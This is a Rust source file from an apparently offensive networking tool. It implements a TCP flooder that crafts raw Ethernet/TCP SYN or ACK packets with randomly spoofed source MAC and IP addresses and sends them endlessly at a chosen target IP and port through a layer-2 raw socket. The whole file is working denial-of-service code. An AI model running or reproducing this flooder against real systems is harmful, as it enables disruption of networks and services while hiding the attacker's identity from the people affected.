use std::{net::Ipv4Addr};
use crate::engines::TcpArgs;
use crate::generators::RandomValues;
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::{abort, inline_display, get_first_and_last_ip, parse_mac, mac_u8_to_string};



pub struct TcpFlooder {
    args:      TcpArgs,
    builder:   PacketBuilder,
    iface:     String,
    pkt_data:  PacketData,
    pkts_sent: usize,
    rand:      RandomValues,
}


impl TcpFlooder {

    pub fn new(args: TcpArgs) -> Self {
        let iface               = IfaceInfo::iface_from_ip(args.target_ip);
        let (first_ip, last_ip) = get_first_and_last_ip(&iface);

        Self {
            args,
            iface,
            builder:   PacketBuilder::new(),
            pkt_data:  PacketData::new(),
            pkts_sent: 0,
            rand:      RandomValues::new(Some(first_ip), Some(last_ip)),
        }
    }



    pub fn execute(&mut self){
        self.set_pkt_data();
        self.display_pkt_data();
        self.send_endlessly();
    }



    fn set_pkt_data(&mut self) {
        self.pkt_data.src_ip   = self.args.src_ip;
        self.pkt_data.src_mac  = self.resolve_mac(self.args.src_mac.clone());
        self.pkt_data.dst_port = self.args.port;
        self.pkt_data.dst_ip   = self.args.target_ip;
        self.pkt_data.dst_mac  = self.resolve_mac(Some(self.args.target_mac.clone())).unwrap();
        self.pkt_data.flag     = if self.args.ack {"ack".to_string()} else {"syn".to_string()};
    }



    fn resolve_mac(&self, input_mac: Option<String>) -> Option<[u8; 6]> {
        if input_mac.is_none() {
            return None;
        }

        let mac = input_mac.unwrap();

        let mac_to_parse = match mac.as_str() {
            "gateway" => IfaceInfo::gateway_mac(&self.iface).unwrap().to_string(),
            "local"   => IfaceInfo::mac(&self.iface),
            _         => mac
        };

        match parse_mac(&mac_to_parse) {
            Err(e)  => { abort(e) },
            Ok(mac) => { Some(mac) },    
        }
    }


    
    fn display_pkt_data(&self) {
        let src_mac = match self.pkt_data.src_mac {
            Some(mac) => mac_u8_to_string(mac),
            None      => "Random".to_string(),
        };

        let src_ip = match self.pkt_data.src_ip {
            Some(ip) => ip.to_string(),
            None     => "Random".to_string(),
        };

        println!("SRC >> MAC: {}  IP: {}", src_mac, src_ip);
        println!("DST >> MAC: {}  IP: {}", mac_u8_to_string(self.pkt_data.dst_mac), self.pkt_data.dst_ip);
        println!("IFACE: {}", self.iface);
    }



    fn send_endlessly(&mut self) {
        let socket = Layer2RawSocket::new(&self.iface);

        loop {
            let pkt = self.get_pkt();
            socket.send(pkt);

            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
    }


    
    #[inline]
    fn get_pkt(&mut self) -> &[u8] {
        self.builder.tcp_ether(
            self.pkt_data.src_mac.unwrap_or_else(|| self.rand.random_mac()), 
            self.pkt_data.src_ip.unwrap_or_else( || self.rand.random_ip()), 
            self.rand.random_port(),
            self.pkt_data.dst_mac, 
            self.pkt_data.dst_ip,
            self.pkt_data.dst_port,
            &self.pkt_data.flag
        )
    }

}



struct PacketData {
    src_ip:   Option<Ipv4Addr>,
    src_mac:  Option<[u8; 6]>,
    dst_ip:   Ipv4Addr,
    dst_mac:  [u8; 6],
    dst_port: u16,
    flag:     String,
}


impl PacketData {
    fn new() -> Self {
        Self {
            src_ip:   None,
            src_mac:  None,
            dst_ip:   Ipv4Addr::new(0, 0, 0, 0),
            dst_mac:  [0u8; 6],
            dst_port: 0,
            flag:     "".to_string(),
        }
    }
}



impl crate::EngineTrait for TcpFlooder {
    type Args = TcpArgs;
    
    fn new(args: Self::Args) -> Self {
        TcpFlooder::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}